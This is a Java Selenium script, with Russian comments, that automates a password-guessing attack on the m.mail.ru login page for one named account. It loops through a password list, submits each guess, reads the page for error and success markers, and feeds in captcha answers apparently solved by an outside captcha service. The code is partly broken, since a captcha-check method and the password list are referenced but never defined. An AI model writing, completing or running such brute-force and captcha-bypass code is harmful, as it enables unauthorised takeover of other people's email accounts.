import net.marketer.RuCaptcha;
//import org.openqa.selenium.*;
import org.openqa.selenium.*;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;


public class Main {
    private static WebDriver driver;
    private static WebElement err;
    private static String PATH_TO_HOME = "C:\\Users\\b.admin\\Desktop\\mbr\\";

    public static boolean login(WebDriver driver, String login, String pass) throws Exception { //попытка авторизации
        try {
            //ждем формы
            WebElement loginInput = (new WebDriverWait(driver, 10))
                    .until(ExpectedConditions.presenceOfElementLocated(By.name("Login")));
            WebElement passInput = (new WebDriverWait(driver, 10))
                    .until(ExpectedConditions.presenceOfElementLocated(By.name("Password")));
            //заполняем логин и пасс
            loginInput.sendKeys(login);
            passInput.sendKeys(pass);
            //сендим форму
            loginInput.submit();
            System.out.println("Форма отправлена, логин: " + login + " пароль: " + pass);
            checkErrorMsg(driver);
            return true;
        } catch (org.openqa.selenium.TimeoutException e) { //если не нашли все формы
            System.out.println("Не нашли формы для заполнения");
            return false;
        }
    }

    public static boolean checkErrorMsg(WebDriver driver) throws Exception { // чекаем сообщение об ошибке авторизации. Есть - true, не найдено - false.
        try {
            WebElement errorMsg = (new WebDriverWait(driver, 10))
                    .until(ExpectedConditions.presenceOfElementLocated(By.className("error")));
            checkCapcha(driver);
            return true;
        } catch (org.openqa.selenium.TimeoutException e) {
            System.out.println("Сообщение об ошибке авторизации отсутствует");
            checkLogin(driver);
            return false;
        }
    }


    public static boolean checkLogin(WebDriver driver) { // проверяем на предмет успешной авторизации по элементу с id "PH_user-email"
        try {
            err = (new WebDriverWait(driver, 10))
                    .until(ExpectedConditions.presenceOfElementLocated(By.id("PH_user-email")));
            System.out.println(">Залогинились< пароль:^");
            return true;
        } catch (org.openqa.selenium.TimeoutException e) { // если признак успешной авторизации не найден
            System.out.println("Авторизация неуспешна. Наверно что-то с инетом или чет странное, смотри браузер, а да, чуть не забыл, вот тебе стектрейс:" + e);
            return false;
        }
    }

    //###########################ПОСВЯЩЯЮ НИЖЕКОД ЕЁ МЕРЗЕЙШИСТВУ - КАПЧЕ







    public static void tryEnterRecognizedCapcha(WebDriver driver, String pass, String recognizedCapcha) {
        try {
            WebElement passInput = (new WebDriverWait(driver, 10))
                    .until(ExpectedConditions.presenceOfElementLocated(By.name("Password")));
            WebElement captchaInput = (new WebDriverWait(driver, 10))
                    .until(ExpectedConditions.presenceOfElementLocated(By.name("captcha")));
            //заполняем пасс и капчу
            passInput.sendKeys(pass);
            captchaInput.sendKeys(recognizedCapcha);
            //сендим форму
            captchaInput.submit();
            driver.get("https://m.mail.ru/login");
        } catch (org.openqa.selenium.TimeoutException e) {
            System.out.println("не дождались инпутов при вводе капчи");
        }


    }
//

    //КАПЧА ТЫ ИЗИ END


    public static void main(String[] args) throws Exception {
        //#########################################################

        System.setProperty("webdriver.gecko.driver", "c:\\geckodriver.exe");
        WebDriver driver = new FirefoxDriver();
        driver.manage().window().maximize();
        driver.get("https://m.mail.ru/login");
        //#########################################################

        for (String pass : passwordFromFile) {
            // чекаем есть ли капча
            if (!checkCapcha(driver)) { //капчи нет
                login(driver, "origamycpa2", pass);
            } else { //капча есть
                //реализовано в методе checkCapcha
            }

        }


    }
}